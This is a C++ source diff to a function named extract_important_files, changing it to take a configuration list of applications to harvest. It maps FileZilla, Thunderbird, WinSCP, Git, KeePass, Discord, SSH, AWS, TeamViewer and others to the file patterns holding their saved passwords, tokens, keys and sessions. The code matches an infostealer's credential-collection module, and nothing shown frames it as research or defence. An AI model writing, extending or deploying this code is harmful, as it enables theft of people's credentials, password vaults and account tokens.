@@ -143,7 +143,7 @@ static void extract_from_path(const std::string& folderPath, const std::vector<s
     } catch (...) {}
 }
 
-std::vector<ImportantFile> extract_important_files() {
+std::vector<ImportantFile> extract_important_files(const std::vector<ImportantFileConfig>& config) {
     std::vector<ImportantFile> files;
     
     // Get username
@@ -158,8 +158,89 @@ std::vector<ImportantFile> extract_important_files() {
     }
     std::string userHome = userProfile;
     
-    // Define all extraction targets
-    std::vector<ExtractionTarget> targets = {
+    std::vector<ExtractionTarget> targets;
+    
+    // If config is provided, use it; otherwise use defaults
+    if (!config.empty()) {
+        // Use provided configuration - only process enabled items
+        for (const auto& fileConfig : config) {
+            if (fileConfig.enabled && !fileConfig.path.empty()) {
+                // Determine file patterns and recursive based on app name
+                std::vector<std::string> patterns = {"*"}; // Default to all files
+                bool recursive = true; // Default to recursive
+                
+                // Map app names to their typical file patterns (simplified - can be enhanced)
+                if (fileConfig.appName == "FileZilla") {
+                    patterns = {"SITEMANAGER.XML", "RECENTSERVERS.XML", "FILEZILLA.XML"};
+                    recursive = false;
+                } else if (fileConfig.appName == "Steam") {
+                    patterns = {".VDF", ".TMP"};
+                    recursive = true;
+                } else if (fileConfig.appName == "Outlook") {
+                    patterns = {".OST", ".PST"};
+                    recursive = true;
+                } else if (fileConfig.appName == "Thunderbird") {
+                    patterns = {"LOGINS.JSON", "KEY4.DB"};
+                    recursive = true;
+                } else if (fileConfig.appName == "WinSCP") {
+                    patterns = {"WINSCP.INI", "STORED SESSIONS"};
+                    recursive = true;
+                } else if (fileConfig.appName == "CiscoVPN") {
+                    patterns = {".XML"};
+                    recursive = true;
+                } else if (fileConfig.appName == "OpenVPN") {
+                    patterns = {".OVPN", "CONFIG.JSON"};
+                    recursive = true;
+                } else if (fileConfig.appName == "HeidiSQL") {
+                    patterns = {"HEIDISQL_SETTINGS.XML", "SESSIONS.XML", ".XML"};
+                    recursive = false;
+                } else if (fileConfig.appName == "DBeaver") {
+                    patterns = {".DBEAVER-DATA-SOURCES.XML", "DATA-SOURCES.XML"};
+                    recursive = true;
+                } else if (fileConfig.appName == "VSCode") {
+                    patterns = {"SETTINGS.JSON", "STATE.VSCDB", ".VSCDB"};
+                    recursive = true;
+                } else if (fileConfig.appName == "Git") {
+                    patterns = {".GIT-CREDENTIALS"};
+                    recursive = false;
+                } else if (fileConfig.appName == "KeePass") {
+                    patterns = {".KDBX", ".KDB"};
+                    recursive = true;
+                } else if (fileConfig.appName == "Discord") {
+                    patterns = {".LDB", ".LOG"};
+                    recursive = false;
+                } else if (fileConfig.appName == "TeamViewer") {
+                    patterns = {"CONNECTIONS.XML", "TEAMVIEWER.INI", ".XML", ".INI"};
+                    recursive = false;
+                } else if (fileConfig.appName == "RemoteDesktop") {
+                    patterns = {".RDP"};
+                    recursive = true;
+                } else if (fileConfig.appName == "Cyberduck") {
+                    patterns = {"BOOKMARKS.PLIST", ".PLIST"};
+                    recursive = true;
+                } else if (fileConfig.appName == "7Zip") {
+                    patterns = {"7ZFM.INI"};
+                    recursive = false;
+                } else if (fileConfig.appName == "SSH") {
+                    patterns = {"*"};
+                    recursive = false;
+                } else if (fileConfig.appName == "AWS") {
+                    patterns = {"CREDENTIALS", "CONFIG", "*"};
+                    recursive = false;
+                }
+                // For all other apps, use default patterns and recursive
+                
+                targets.push_back({
+                    fileConfig.appName,
+                    {fileConfig.path},
+                    patterns,
+                    recursive
+                });
+            }
+        }
+    } else {
+        // Fall back to default hardcoded targets if no config provided
+        targets = {
         // FileZilla
         {"FileZilla", 
          {"%APPDATA%\\FileZilla"}, 
@@ -389,7 +470,8 @@ std::vector<ImportantFile> extract_important_files() {
         {"AWS",
          {"%USERPROFILE%\\.aws"},
          {"CREDENTIALS", "CONFIG", "*"}, false}
-    };
+        };
+    }
     
     // Process each target
     for (const auto& target : targets) {
